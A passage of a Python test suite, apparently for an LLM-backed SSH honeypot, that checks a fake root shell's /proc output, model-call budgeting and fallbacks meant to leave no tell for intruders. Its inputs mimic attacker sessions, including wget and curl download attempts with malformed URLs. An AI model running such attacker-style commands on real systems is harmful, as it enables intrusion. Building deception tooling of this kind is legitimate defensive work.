    pages = {"MemTotal", "MemFree", "MemAvailable", "Buffers", "Cached", "Active", "Inactive",
             "AnonPages", "Mapped", "Shmem", "KReclaimable", "Slab", "SReclaimable",
             "SUnreclaim", "CommitLimit", "Committed_AS", "Dirty"}
    rows = dict(line.split(":") for line in out("cat /proc/meminfo", h).splitlines())
    for key in pages:
        assert int(rows[key].split()[0]) % 4 == 0, key
    assert int(rows["KernelStack"].split()[0]) % 16 == 0
    free = out("free", h).splitlines()[1].split()
    assert int(free[1]) == int(rows["MemTotal"].split()[0])
    assert int(free[3]) == int(rows["MemFree"].split()[0])


# ---- the model path ---------------------------------------------------------------------------

class FailingAfter(RecordingHistory):
    """Answers with ``reply`` for the first ``ok`` calls, then raises."""

    def __init__(self, reply, ok):
        super().__init__(reply)
        self.ok = ok

    async def ainvoke(self, payload, config=None):
        if len(self.calls) >= self.ok:
            self.calls.append(payload["messages"][-1].content)
            raise RuntimeError("provider down")
        return await super().ainvoke(payload, config)


async def test_local_answers_are_charged_to_the_estimate_and_clipped_in_history():
    budget = Budget(BudgetConfig())
    hooks.set_budget(budget)
    history = RecordingHistory()
    text = "cat /proc/cpuinfo /proc/cpuinfo /proc/cpuinfo"
    r = await _ask(history, text)
    assert r.local_reply and len(r.content) > hooks.MAX_LOCAL_HISTORY
    stored = history.store["s1"].messages[-1].content
    assert len(stored) <= hooks.MAX_LOCAL_HISTORY + len("root@srv01:~# ") + 200
    assert stored.endswith("root@srv01:~# ")
    state = budget._sessions["s1"]
    assert state.history_chars == len(text) + len(stored)
    assert budget.estimate("s1", "203.0.113.9", "x") > budget.estimate("s9", "203.0.113.9", "x")


async def test_after_the_model_answers_once_it_answers_everything():
    hooks.set_budget(Budget(BudgetConfig()))
    history = RecordingHistory()
    assert getattr(await _ask(history, "uname -n"), "local_reply", False)
    await _ask(history, "hostname newname")          # unknown form: the model handles it
    await _ask(history, "uname -n")
    await _ask(history, "cat /etc/hostname")
    await _ask(history, "id bob")
    assert history.calls == ["hostname newname", "uname -n", "cat /etc/hostname", "id bob"]


async def test_fallback_after_a_model_cd_keeps_the_models_directory():
    hooks.set_budget(Budget(BudgetConfig()))
    history = FailingAfter("root@srv01:/var/tmp# ", ok=1)
    await _ask(history, "cd /var/tmp")
    r = await _ask(history, "pwd")
    assert history.calls == ["cd /var/tmp", "pwd"]
    assert r.content == "/var/tmp\r\nroot@srv01:/var/tmp# "
    hooks.session_close("s1")
    assert "s1" not in hooks._session_prompts


def test_wc_of_only_unreadable_files_reports_the_error():
    reply = out("wc -l /etc/redhat-release")
    assert reply is not None and "No such file or directory" in reply
    assert out("wc -l /etc/redhat-release /proc/version").count("\n") == 2


@pytest.mark.parametrize("line", ["wget 'http://['", "curl 'http://[bad]'",
                                  "curl -s 'http://[]:99999/x'"])
def test_malformed_download_urls_get_a_reply(line):
    assert out(line) is not None


def test_a_fault_inside_a_command_falls_back_instead_of_raising(monkeypatch, caplog):
    def boom(*_a, **_k):
        raise RuntimeError("bug")
    monkeypatch.setattr(shell.Shell, "_pipeline", boom)
    assert out("uname -a") is None
    assert "canned shell failed" in caplog.text
    assert hooks.fallback_reply("uname -a", False, "root") == ""    # a known command: no tell
